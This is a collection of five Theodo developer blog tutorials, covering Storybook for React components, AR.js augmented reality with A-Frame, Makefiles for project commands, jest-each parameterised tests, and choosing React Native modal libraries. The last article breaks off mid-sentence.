[
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA year ago I was a young developer starting his journey on React. My client came to see my team and told us: \u201cWe need to make reusable components\u201d, I asked him: \u201cWhat is a reusable component?\u201d and the answer was \u201cThis project is a pilot on the subject\u201d.\n2 months later another developer tried to use our components and the disillusion started: despite our efforts, our component were not reusable\u00a0\ud83d\ude31\nAt the time we managed to work with him to improve our code so that he could use it, but how could we have avoided the problem?\nThe answer was given to me by Florian Rival, a former developer at Bam, now working for Facebook: Storybook !\n Storybook, what is that?\nIt is an open source visual documentation software (here is the repo). It allows you to display the different states of your component. The cluster of all the different cases for your component are called the component stories.\nThis allows you to visually describe your components and so anyone who wants to use your components can just look at your stories and see how to use it. No need to dig in the code to find all the use cases, they are all there!\nA picture is worth a thousand words, I let you check the best example I know, the open Storybook of Airbnb.\nOne interesting thing to\u00a0note is that it\u2019s working with Vue, Angular and React!\nUsage example\nLet\u2019s make an example to explain this better to you. I will use a react todo list, I started with the one on this repo.\nThen I added Storybook to the project, I won\u2019t detail this part as the\u00a0Storybook doc\u00a0is very good. I would say it takes approximately 20 minutes to add storybook to your project, but might take longer to properly setup the webpack for your css.\nNow I\u2019ll focus on the component FilteredList that display the todos, first it looked like this:\n\r\nimport React from 'react';\r\nimport styled from 'styled-components';\r\nimport TodoItem from './TodoItem';\r\n\r\nconst StyledUl = styled.ul`\r\n  list-style: none;\r\n`;\r\n\r\nconst StyledP = styled.p`\r\n  margin: 10px 0;\r\n  padding: 10px;\r\n  border-radius: 0;\r\n  background: #f2f2f2;\r\n  border: 1px solid rgba(229, 229, 229, 0.5);\r\n  color: #888;\r\n`;\r\n\r\nexport default function FilteredList(props) {\r\n    const {items, changeStatus} = props;\r\n\r\n    if (items.length === 0) {\r\n        return (\r\n            <StyledP>There are no items.</StyledP>\r\n        );\r\n    }\r\n\r\n    return (\r\n        <StyledUl>\r\n            {items.map(item => (\r\n                <TodoItem key={item.id} data={item} changeStatus={changeStatus}/>\r\n            ))}\r\n        </StyledUl>\r\n    );\r\n}\r\n\n(It is not exactly the same as the one on the repo, I\u00a0used styled-component instead of plain css)\nTodoItem is the component that displays an element of the list.\nHere we can see there are two different branches in the render: the nominal case and the empty state.\nLet\u2019s write some stories, I created a file FilteredList.stories.js\u00a0and added this inside:\n\r\nimport React from 'react';\r\nimport { storiesOf } from '@storybook/react';\r\nimport FilteredList from \"./FilteredList\";\r\n\r\nconst data = [{\r\n    id: 1,\r\n    completed: true,\r\n    text: 'Jean-Claude Van Damme'\r\n}];\r\n\r\nstoriesOf('FilteredList')\r\n    .add('Nominal usage', () => (\r\n        <FilteredList items={data} changeMode={() => void 0}/>\r\n    ))\r\n    .add('Empty state', () => (\r\n        <FilteredList items={[]} changeMode={() => void 0}/>\r\n    ));\r\n\nSo what did I do here?\nI defined placeholder data in a variable for the component props.\nWe use the function storiesOf\u00a0from storybook, this function takes the name we want to give to the group of stories as entry param.\nThen we add some stories with .add. It is is pretty much working like jest or mocha\u2019s\u00a0describe or\u00a0it\u00a0in tests, it takes the name of the story and a function that returns the component to render.\nHere\u2019s what it looks like:\n\n\nIt\u2019s rather simple but it\u2019s working, we see the two different cases.\nWhat if we add other branches? Lets say the parent component of FilteredList\u00a0is calling an API to get the list and so we have to add a loading and error state.\n\r\nexport default function FilteredList(props) {\r\n    const {items, changeStatus, isLoading, error} = props;\r\n\r\n    if (isLoading) {\r\n        return (\r\n            <StyledP>Loading...</StyledP>\r\n        )\r\n    }\r\n\r\n    if (error) {\r\n        return (\r\n            <StyledP>Sorry an error occurred with the following message: {error}</StyledP>\r\n        )\r\n    }\r\n    \r\n    //...\r\n}\r\n\nNow we need to add the corresponding stories.\n\r\n.add('Loading state', () => (\r\n        <FilteredList items={[]} changeMode={() => void 0} isLoading />\r\n))\r\n.add('Error state', () => (\r\n    <FilteredList items={[]} changeMode={() => void 0} error=\"Internal server error\"/>\r\n));\r\n\nAnd now our Storybook looks like:\n\n\nThis example is rather simple but it is showing pretty well how we worked with Storybook. Each time you create new component behaviors you then create the corresponding stories.\nAin\u2019t nobody got time for that\nIn fact it takes time when you are coding but I feel like it is more like a investment.\nWhen you develop your app\u00a0aren\u2019t you trying to make it as easy to use? Then why not make it easy for developers to use your code?\nAnd that\u2019s where Storybook is helping you, now your components are easier to share, this leads to a better collaboration between developers and therefore to better component development practices shared inside the team.\nThis is very important because you are not the only user of your code, you\u2019re maybe working with a team or someone else will\u00a0take over\u00a0your project afterwards.\nWe all had this part in our project code that have been here for ages and no one really know how to deal with it, how to avoid that? Make it good the first time you code it! Seems obvious but still is right, and for that you can use Storybook to share your front end components and make perfect APIs! (or at least very good ones)\nFinal thoughts\nIn a way we are all trying to do reusable components \u2013 whether you are trying to do a library or not, you want other members of your team to be able to update/fix your code. It\u2019s not easy to make perfect APIs for your components if you can not have a lot of user feedback and that\u2019s why Storybook or any visual doc are so efficient. They improve greatly the vision others have of your component and help them modify it without breaking anything.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tL\u00e9o Anesi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn this tutorial, you will see how to use ARjs on simple examples in order to discover this technology. You don\u2019t need any huge tech background in order to follow this tutorial.\n1 \u2013 Your very first AR example\nFirst we will start with a simple example that will help us understand all the elements we need to start an ARjs prototype.\nLibrary import\nAs I wished to keep it as simple as possible we will only use html static files and javascript libraries. Two external librairies are enough to start with ARjs.\nFirst we need A-Frame library, a web-framework for virtual reality. It is based on components that you can use as tag once defined.\nYou can import A-Frame library using the folowing line :\n<script src=\"https://aframe.io/releases/0.6.1/aframe.min.js\"></script>\r\n\nThen we need to import ARjs, the web-framework for augmented reality we are going to use.\n<script src=\"https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js\"></script>\r\n\nInitialize the scene\nA-Frame works using a scene that contains the elements the user wants to display. To create a new scene, we use the a-scene tag :\n<a-scene stats embedded arjs='trackingMethod: best; debugUIEnabled: false'>\r\n  <!-- All our components goes here -->\r\n</a-scene>\r\n\nNote the 2 elements we have in our a-scene tag :\n\nstats : it displays stats about your application performance. You are free to remove it, but to start it will give us some useful information.\narjs : Here you can find some basic ARjs configuration. trackingMethod is the type of camera tracking you use, here we have choosen which is an auto configuration that will be great for our example. And debugUIEnabled is set at false in order to remove debugging tools from the camera view.\n\nShape\nThen we will use our first a-frame component. A-frame is built around a generic component a-entity that you use and edit to have the behaviour you want.\nIn this demo, we want to display a cube. Thankfully a components exists in A-frame, already implemented, that can be used to do that :\n<a-box position=\"0 0 0\" rotation=\"0 0 0\"></a-box>\r\n\na-box has a lot of attributes on which you can learn more in the official documentation, here we will focus on two attributes :\n\nposition : the three coordinates that will be used to position our components\nrotation : that color of the shape\n\nMarker\nWe are going to use a Hiro marker to start. It is a special kind of marker designed for augmented reality. We will dig deeper into other markers in one of the following part.\n\nDeployment\nAs announced we want to make our application accessible from a mobile device, so we will need to deploy our web page and make it accessible from our smartphone.\nhttp-server\nThere are a lot of node modules that you can use to start a development web server, I choose to use http-server which is very simple and can be used with a single command line.\nFirst you need to install the module by running the following command\nnpm install -g http-server\r\n\nThen to launch your server, you can do it with the command line :\nhttp-server\r\n\nYou can use other tools, such as the python based SimpleHTTPServer which is natively available on macOS with the following command:\npython -m SimpleHTTPServer 8000\r\n\nngrok\nNow that your server is running, you need to make your webpage accessible for your mobile device. We are going to use ngrok. It is a very simple command line tool that you can download from here : https://ngrok.com/download.\nThen you use ngrok with the following command :\nngrok http 8080\r\n\nIt will redirect all connections to the address : http://xxxxxx.ngrok.io, directly toward your server and your html page.\nSo with our index.html containing the following :\n<!doctype HTML>\r\n<html>\r\n<script src=\"https://aframe.io/releases/0.6.1/aframe.min.js\"></script>\r\n<script src=\"https://rawgit.com/donmccurdy/aframe-extras/master/dist/aframe-extras.loaders.min.js\"></script>\r\n<script src=\"https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js\"> </script>\r\n  <body style='margin : 0px; overflow: hidden;'>\r\n    <a-scene stats embedded arjs='trackingMethod: best;'>\r\n      <a-marker preset=\"hiro\">\r\n      <a-box position='0 1 0' material='color: blue;'>\r\n      </a-box>\r\n      </a-marker>\r\n      <a-entity camera></a-entity>\r\n    </a-scene>\r\n  </body>\r\n</html>\r\n\nOr if you prefer on codepen.\nAnd the result should look like :\n\n2 \u2013 Animation\nNow that we were able to display our first A-frame component, we want to make it move.\nA-frame contains a component a-animation that has been designed to animate an entity. As A-frame uses tag components, the a-animation has to be inside the entity tag that you want to animate :\n  <a-entity>\r\n    <a-animation></a-animation>\r\n  </a-entity>\r\n\na-animation can be used on various attributes of our entity such as position, rotation, scale or even color.\nWe will see in the next part what can be done with these attributes.\nBasics\nFirst we will focus on some basic elements that we will need but you will see that it is enough to do a lot of things.\n\ndur : duration of the animation\nfrom : start position or state of the animation\nto : end position or state of the animation\nrepeat : if and how the animation should be repeated\n\nPosition\nWe will begin with the position, we want our object to move from one position to another. To start with this animation, we only need a 3 dimension vector indicating the initial position and the final position of our object.\nOur code should look like this :\n<a-animation attribute=\"position\"\r\n    dur=\"1000\"\r\n    from=\"1 0 0\"\r\n    to=\"0 0 1\">\r\n</a-animation>\r\n\nRotation\nRotations work the same, except that instead of a vector you have to indicate three angles :\n<a-animation attribute=\"rotation\"\r\n    dur=\"2000\"\r\n    from=\"0 0 0\"\r\n    to=\"360 0 0\"\r\n    repeat=\"indefinite\">\r\n</a-animation>\r\n\nYou can either make your entity rotate on itself:\n\nYou can access the full code here.\nOr make it rotates around an object:\n\nAnd the full code is here.\nOthers properties\nThis animation pattern works on a lot of others properties, for example :\n\nScale :\n\n<a-animation\r\n    attribute=\"scale\"\r\n    to=\"2 2 3\">\r\n</a-animation>\r\n\n\nColor :\n\n<a-animation\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nTrigger\na-animation has a trigger : begin. That can either be used with a delay or an event. For example :\n<a-animation\r\n    begin=\"3000\"\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nThis animation will start in 3000ms.\nOtherwise with an event you can use :\n<a-entity id=\"entity\">\r\n<a-animation\r\n    begin=\"colorChange\"\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nWith the event emission :\ndocument.querySelector('#entity').emit('colorChange');\r\n\nCombining\nYou can of course, use multiple animations either by having multiple entities with their own animations or by having imbricated entities that share animation.\nFirst case is very simple you only have to add multiple entities with an animation for each.\nSecond one is more difficult because you must add an entity inside an entity, like in this example :\n<a-entity>\r\n    <a-animation attribute=\"rotation\"\r\n      dur=\"2000\"\r\n      easing=\"linear\"\r\n      from=\"0 0 0\"\r\n      to=\"0 360 0\"\r\n      repeat=\"indefinite\"></a-animation>\r\n          <a-entity rotation=\"0 0 25\">\r\n              <a-sphere position=\"2 0 2\"></a-sphere>\r\n          </a-entity>\r\n</a-entity>\r\n\nThe first entity is used as the axis for our rotating animation.\n3 \u2013 Model loading\nType of models\nYou can also load a 3D model inside ARjs and project it on a marker. A-frame works with various models type but glTF is privilegied so you should use it.\nYou can generate your model from software like Blender. I have not so much experience in this area, but if you are interested you should give a look at this list of tutorials: https://www.blender.org/support/tutorials/\nYou can also use an online library to download models, some of them even allow you to directly use their models.\nLoading a model from the internet\nDuring the building of this tutorial, I found KronosGroup github that allow me to made my very first examples with 3d model. You can find all their work here : https://github.com/KhronosGroup/glTF-Sample-Models\nWe will now discover a new component from A-frame : a-asset. It is used to load your assets inside A-frame, and as you can guess our 3d model is one of our asset.\nTo load your 3d model, we will use the following piece of code :\n<a-assets>\r\n      <a-asset-item id=\"smiley\" src=\"https://cdn.rawgit.com/KhronosGroup/glTF-Sample-Models/9176d098/1.0/SmilingFace/glTF/SmilingFace.gltf\"></a-asset-item>\r\n</a-assets>\r\n\nYou can of course load your very own model the same way.\na-asset works as a container that will contain the a-asset-item you will need in your page. Those a-asset-item are used to load 3d model.\nThe full example look like this.\nDisplay your model\nNow that we have loaded our model, we can add it into our scene and start manipulating it. To do that we will need to declare an a-entity inside our a-scene that will be binded to the id of our a-asset-item. The code look like :\n<a-entity gltf-model=\"#smiley\" rotation= \"180 0 0\">\r\n</a-entity>\r\n\nRemember what we did in the previous part with animation. We are still working with a-entity so we can do the same here. The full code for our moving smiley is here.\nAnd here is a demo :\n\n4 \u2013 Markers\nFor now we only have used Hiro marker, now we will see how we can use other kind of marker.\nBarcode\nIn ARjs barcode are also implemented in case you need to have a lot of different marker without waiting to create them from scratch. You first need to declare in the a-scene component what kind of marker you are looking for :\n<a-scene arjs='detectionMode: mono_and_matrix; matrixCodeType: 5x5;'></a-scene>\r\n\nAs you can guess, our value will be found in a 5\u00d75 matrix. And now the a-marker component will look like :\n<a-marker type='barcode' value='5'></a-marker>\r\n\nCustom marker\nYou can also use your very own custom marker. Select the image you want, and use this tool developed by ARjs developer.\nYou can then download the .patt file and you can use it in your application, like this:\n<a-marker-camera type='pattern' url='path/to/pattern-marker.patt'></a-marker-camera>\r\n\nMultiple markers\n<script src=\"https://aframe.io/releases/0.6.0/aframe.min.js\"></script>\r\n<script src=\"https://jeromeetienne.github.io/AR.js/aframe/build/aframe-ar.js\"></script>\r\n<body style='margin : 0px; overflow: hidden;'>\r\n  <a-scene embedded arjs='sourceType: webcam;'>\r\n\r\n    <a-marker type='pattern' url='path/to/pattern-marker.patt'>\r\n      <a-box position='0 0.5 0' material='color: red;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-marker preset='hiro'>\r\n      <a-box position='0 0.5 0' material='color: green;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-marker type='barcode' value='5'>\r\n      <a-box position='0 0.5 0' material='color: blue;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-entity camera></a-entity>\r\n  </a-scene>\r\n</body>\r\n\nWhat\u2019s next\nYou now have everything you need to start and deploy a basic AR web application using ARjs.\nIf you are interested in web augmented or virtual reality you can give a deeper look at the A-Frame library so that you will see you can build more custom component or even component you can interact with.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBastien Teissier\r\n  \t\t\t\r\n  \t\t\t\tWeb developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tFor one of Theodo\u2019s clients, we built a complex website including a catalog, account management and the availability to order products.\nAs a result, the project was complex, with several languages (symfony, vue, javascript), utilities (docker, aws, webpack) and microservices (for the search of products, the management of accounts, the orders).\nThe impact of this complexity for the development teams was the numerous commands they had to use every day, and particularly to install the project.\nThus, and following Symfony 4 best practices, we decided to use make\u00a0on the project to solve these problems.\nAnd it worked!\nWhat is make\nMake is a build automation tool created in 1976, designed to solve dependency problems of the build process.\nIt was originally used to get compiled files from source code, for instance for C language.\nIn website development, an equivalent could be the installation of a project and its dependencies from the source code.\nLet me introduce a few concepts about make that we will need after.\nMake reads a descriptive file called Makefile, to build a target, executing some commands, and depending on a prerequisite.\nThe architecture of the Makefile is the following:\n\r\ntarget: [prerequisite]\r\n    command1\r\n    [command2]\r\n\nAnd you run make target in your terminal to execute the target\u00a0commands. Simple, right?\nUse it for project installation\nWhat is mainly used to help project installation is a README describing the several commands you need to run to get your project installed.\nWhat if all these commands were executed by running make install?\nYou would have your project working with one command, and no documentation to maintain anymore.\nI will only describe a simple way to build dependencies from your composer.json file\n\r\nvendor: composer.json\r\n    composer install\r\n\nThis snippet will build the vendor directory, running composer install, only if the vendor directory does not exist. Or if composer.json file has changed since the last time you built the vendor directory.\nNote that if you don\u2019t want to check the existency of a directory or a file named as your target, you can use a Phony Target. It means adding the line .PHONY: target to your Makefile.\nThere is much more you can do, and I won\u2019t talk about it here.\nBut if you want a nice example to convert an installation README\u00a0into a Makefile, you can have a look at these slides,\u00a0that are coming from a talk at Paris Symfony Live 2018.\nUse it for the commonly used commands you need on your project\nAfter the project installation, a complexity for the developer is to find the commands needed to develop features locally.\nWe decided to create a Makefile\u00a0to gather all the useful commands we use in the project on a daily basis.\nWhat are the advantages of this:\n\nThe commands are committed and versioned\nAll developers of the team are using the same, reviewed commands. -> there is no risk to forget one thing before executing a command line and break something\nIt is language agnostic -> which means you can start php jobs, javascript builds, docker commands, \u2026\nIt\u2019s well integrated with the OS -> for instance there is autocompletion for targets and even for options\nYou can use it for continuous improvement -> when a command fails for one dev, modify that command and commit the new version. It will never fail anymore!\n\nAuto-generate a help target\nBut after a long time, we started having a lot of commands.\nIt was painful to find the one you wanted in the file, and even to know the one that existed\nSo we added a new target help, in order to automatically generate a list of available commands from the comments in the Makefile.\nThe initial snippet we used is:\n\r\n.DEFAULT_GOAL := help\r\nhelp:\r\n    @grep -E '(^[a-zA-Z_-]+:.*?##.*$$)|(^##)' $(MAKEFILE_LIST) | awk 'BEGIN {FS = \":.*?## \"}{printf \"\\033[32m%-30s\\033[0m %s\\n\", $$1, $$2}' | sed -e 's/\\[32m##/[33m/'\r\n\nIf you add the following target and comments in your Makefile:\n\r\n## Example section\r\nexample_target: ## Description for example target\r\n        @does something\r\n\nIt would give this help message:\n\nThis generic, reusable snippet has another advantage: the documentation it generates is always up to date!\nAnd you can customize it to your need, for instance to display options associated to your commands.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMartin Guillier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tjest-each is a small library that lets you write jest test cases with just one line.\nIt was added to Jest in version 23.0.1 and makes editing, adding and reading tests much easier. This article will show you how a jest-each test is written with examples of where we use it on our projects.\nA simple example jest test for a currencyFormatter function looks like this:\ndescribe('currencyFormatter', () => {\r\n  test('converts 1.59 to \u00a31.59', () => {\r\n    const input = 1.59;\r\n    const expectedResult = \"\u00a31.59\"\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n  test('converts 1.599 to \u00a31.60', () => {\r\n    const input = 1.599;\r\n    const expectedResult = \"\u00a31.60\"\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nThe currencyFormatter function takes in one number argument, input, and returns a string of the number to 2 decimal places with a \u00a3 prefix. Simple.\nBut, what if you want to add more test cases? Maybe you want your currencyFormatter to comma separate thousands, or handle non-number inputs in a certain way. With the standard jest tests above, you\u2019d have to add five more lines per test case.\nWith jest-each you can add new test cases with just one line:\ndescribe('currencyFormatter', () => {\r\n  test.each`\r\n    input     | expectedResult\r\n    ${'abc'}  | ${undefined}\r\n    ${1.59}   | ${'\u00a31.59'}\r\n    ${1.599}  | ${'\u00a31.60'}\r\n    ${1599}   | ${'\u00a31,599.00'}\r\n    // add new test cases here\r\n  `('converts $input to $expectedResult', ({ input, expectedResult }) => {\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nThere are 4 parts to writing a jest-each test:\n\nThe first line in the template string:\n\ntest.each`\r\n  input | expectedResult\r\n...\r\n`\r\n\nThis defines the variable names for your test, in this case input and expectedResult. Each variable must be seperated by a pipe | character, and you can have as many as you want.\n\nThe test cases:\n\n`...\r\n  ${'abc'}  | ${undefined}\r\n  ${1.59}   | ${'\u00a31.59'}\r\n  ${1.599}  | ${'\u00a31.60'}\r\n  ${1599}   | ${'\u00a31,599.00'}\r\n  // add new test cases here\r\n`\r\n...\r\n\nEach line after the first represents a new test. The variable values are set to the relevant variable names in the first row and they are also seperated by a pipe | character.\n\nPrint message string replacement:\n\n('$input converts to $expectedResult', ...)\r\n\nYou can customise the print message to include variable values by prefixing your variable names with the dollar symbol $. This makes it really easy to identify which test case is failing when you run your tests. For example, the print messages for the example test above looks like this:\n\n\nPassing the variables into the test:\n\n('$input converts to $expectedResult', ({ input, expectedResult }) => {\r\n  expect(someFunction(input)).toBe(expectedResult)\r\n})\r\n\nAn object of variables is passed to the test as the first argument of the anonymous function where you define your test assertions. I prefer to deconstruct the object in the argument.\njest-each with Older Versions of Jest\nYou can still use jest-each with older versions of Jest by installing it independently:\nnpm install jest-each\r\n\nThere are a just two things that you\u2019ll need to do differently in your test files:\n\nImport jest-each at the top of your test file\nUse each``.test instead of test.each``\n\nThe currencyFormatter test above would look like this instead:\nimport each from 'jest-each'\r\n\r\n describe('currencyFormatter', () = {\r\n   each`\r\n     input     | expectedResult\r\n     ${1.59}   | ${'\u00a31.59'}\r\n     ${1.599}  | ${'\u00a31.60'}\r\n     // add new test cases here\r\n   `.test('converts $input to $expectedResult', ({ input, expectedResult }) => {\r\n    expect(currencyFormatter(input)).toBe(expectedResult)\r\n  })\r\n})\r\n\nAnd that\u2019s all there is to it! Now you have enough to start writing tests with jest-each!\njest-each Tests\nService Test Example\njest-each makes testing services, like a currencyFormatter, very quick and easy. It\u2019s also amazing for test driven development if that\u2019s how you like to develop. We have found it has been really useful for documenting how a service is expected to work for new developers joining a project because of how easy the test cases are to read.\nFor example:\nimport currencyFormatter from 'utils/currencyFormatter'\r\n\r\ndescribe('currencyFormatter', () => {\r\n  test.each`\r\n    input    | configObject | expectedResult | configDescription\r\n    ${'abc'} | ${undefined} | ${undefined}   | ${'none'}\r\n    ${5.1}   | ${undefined} | ${'\u00a35.10'}     | ${'none'}\r\n    ${5.189} | ${undefined} | ${'\u00a35.19'}     | ${'none'}\r\n    ${5}     | ${{dec: 0}}  | ${'\u00a35'}        | ${'dec: 0'}\r\n    ${5.01}  | ${{dec: 0}}  | ${'\u00a35'}        | ${'dec: 0'}\r\n    // add new test cases here\r\n  `('converts $input to $expectedResult with config: $configDescription',\r\n    ({ input, configObject, expectedResult} ) => {\r\n      expect(currencyFormatter(input, configObject)).toBe(expectedResult)\r\n    }\r\n  )\r\n})\r\n\nHere we have a slightly more complicated currencyFormatter function that takes an extra configObject argument. We want to test that:\n\nit returns undefined when input is not a number\nthe default number of decimal places is 2\nthat the configObject can set the number of decimal places with the dec key\n\nWe want to be able to identify the tests when they are running so we have also added a configDescription variable so we can add some text to the test\u2019s print message.\nHigher Order Component Test Example\nWe like to use jest-each to test and document the properties added to components by higher order components (HOCs). I\u2019ve found this simple test particularly helpful when refactoring our large codebase of HOCs, where it has prevented bugs on multiple occasions. We have even added a project snippet so that setting up this test for new HOCs is even easier:\nimport { shallow } from 'enzyme'\r\nimport HomePage from '/pages'\r\nimport isLoading from '/hocs'\r\n\r\nconst TestComponent = isLoading(HomePage)\r\n\r\ndescribe('wrapper', () => {\r\n  const component = shallow(<TestComponent/>)\r\n  test.each`\r\n    propName\r\n    ${'isLoading'}\r\n    // add new test cases here\r\n  `('wrapper adds $propName to the component', ({ propName }) => {\r\n    expect(Object.keys(component.props()).toContainEqual(propName)\r\n  })\r\n\r\n  test.each`\r\n    propName\r\n    ${'notThisProp'}\r\n    ${'orThisOne'}\r\n    // add new test cases here\r\n  `('wrapper does not add $propName to the component',\r\n    ({ propName }) => {\r\n      expect(Object.keys(component.props()).not.toContainEqual(propName)\r\n    }\r\n  )\r\n})\r\n\nSnapshot Branches Test Example\nYou can also test multiple snaphsot branches succintly by using jest-each:\nimport Button from '/components'\r\n\r\ndescribe('Component', () => {\r\n  const baseProps = {\r\n    disabled: false,\r\n    size: 'small',\r\n  }\r\n  test.each`\r\n    changedProps        | testText\r\n    ${{}}               | ${'base props'}\r\n    ${{disabled: true}} | ${'disabled = true'}\r\n    ${{size: 'large'}}  | ${'size = large'}\r\n    // add new test cases here\r\n  `('snapshot: $testText', ({ changedProps }) => {\r\n    const component = shallow(<Button {...baseProps} {...changedProps} />)\r\n    expect(component).toMatchSnaphot()\r\n  })\r\n})\r\n\nYou can learn more about snapshot tests here.\nThese three types of tests, plus some Cypress integration and end-to-end tests is enough for our current application\u2026 but that discussion is for another post.\nHappy testing with jest-each!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMike Riddelsdell\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt some point during the development of your React Native application, you will use a Modal. A Modal is a component that appears on top of everything.\nThere are a lot of cool libraries out there for modals, so today, we\u2019ll have a look a the best libraries for different use cases.\nClick on \u201cTap to play\u201d on the playground below to start:\n\n\nYou can experience the app on your phone here and check the code on github.\nBefore choosing a library, you have to\u00a0answer those\u00a02 questions:\n\nWhat do I want to display in the modal ?\nHow great do I want the UX to be ?\n\nTo answer the 2nd question, we list a few criteria that make a good UX :\n1\ufe0f\u20e3 The user can click on a button to close the modal\n2\ufe0f\u20e3 The user can touch the background to close the modal\n3\ufe0f\u20e3 The user can swipe the modal to close it\n4\ufe0f\u20e3 The user can scroll inside the modal\nI)\u00a0Alert\nFirst, if you\u00a0simply want to display some information and perform an action based on\u00a0the decision of your user, you should probably go with a\u00a0native Alert. An alert is enough and provides a much simpler and more expected UX. You can see how it will look like below.\n\nII) Native modal\nIf you want to show more information to your user, like a picture or a customised button, you need a Modal. The simplest modal is the React Native modal. It gives you the bare properties to show and close the modal 1\ufe0f\u20e3, so it is really easy to use \u2705. The downside is that it requires some effort to customise so as to improve the user experience \u274c.\n\r\nimport { Modal } from \"react-native\";\r\n...\r\n        <Modal\r\n          animationType=\"slide\"\r\n          transparent={true}\r\n          visible={this.state.modalVisible}\r\n          onRequestClose={this.closeModal} // Used to handle the Android Back Button\r\n        >\r\n\nIII) Swipeable Modal\nIf you want to improve the UX, you can allow the user to swipe the modal away. For example, if the modal comes from the top like a notification, it feels natural to close it by pulling it up \u2b06\ufe0f. If it comes from the bottom, the user will be surprised if they cannot swipe it down \u2b07\ufe0f. It\u2019s even better to highlight the fact that they can swipe the modal with a little bar with some borderRadius. The best library for that use case would be the react-native-modal library. It is widely customisable and answers to criteria 1\ufe0f\u20e3, 2\ufe0f\u20e3 and 3\ufe0f\u20e3.\n\r\nimport Modal from \"react-native-modal\";\r\n...\r\n        <Modal\r\n          isVisible={this.state.visible}\r\n          backdropOpacity={0.1}\r\n          swipeDirection=\"left\"\r\n          onSwipe={this.closeModal}\r\n          onBackdropPress={this.closeModal}\r\n        >\r\n\nIV) Scrollable modal\nSo far so good, now let\u2019s see some more complex use cases. For instance, you may want the content of the modal to be scrollable (if you are displaying a lot of content or a Flatlist). The scroll may conflict with either the scroll of the modal or the scroll of the container of the Modal, if it is a scrollable component. For this use case, you can still use the react-native-modal library. You will have 1\ufe0f\u20e3, 2\ufe0f\u20e3 and 4\ufe0f\u20e3. You can control the direction of the swipe with\u2026 swipeDirection.\n\r\nimport Modal from \"react-native-modal\";\r\n...\r\n        <Modal\r\n          isVisible={this.state.visible}\r\n          backdropOpacity={0.1}\r\n          onSwipe={this.closeModal}\r\n          // swipeDirection={\"left\"} <-- We can't specify swipeDirection since we want to scroll inside the modal\r\n          onBackdropPress={this.closeModal}\r\n        >\r\n\n\u26a0\ufe0f Don\u2019t try to combine swipeable + scrollable with this library. Instead continue reading\u2026\nV) Swipeable + Scrollable modal\nThe previous libraries are already awesome, but if you want your modal to answer criteria 1\ufe0f\u20e3, 2\ufe0f\u20e3, 3\ufe0f\u20e3and 4\ufe0f\u20e3, you need\u00a0react-native-modalbox. This library is still very easy to use \u2705and has everything out of the box \u2705, and is listed in the awesome libraries by awesome-react-native. The only downside is that the modal from this library always appear from the bottom, and you can only swipe it down \u274c.\n\r\nimport Modal from \"react-native-modalbox\";\r\n...\r\n        <Modal\r\n          style={styles.container}\r\n          swipeToClose={true}\r\n          swipeArea={20} // The height in pixels of the swipeable area, window height by default\r\n          swipeThreshold={50} // The threshold to reach in pixels to close the modal\r\n          isOpen={this.state.isOpen}\r\n          onClosed={this.closeModal}\r\n          backdropOpacity={0.1}\r\n        >\r\n\nTo avoid the collision between the scroll of your content and the swipe to close the modal, you have to specify swipeArea and swipeThreshold.\nConclusion\nThere are a lot of libraries built on top of the native modal. It is important to choose the right one depending on your needs. If you want to control the direction of the swipe, use react-native-modal, but if you want the modal to only come from the bottom, use react-native-modalbox.\nThe libraries I\u2019ve talked about are amazing. Thanks to their contributors.\n\nPlease reach out if you think I missed 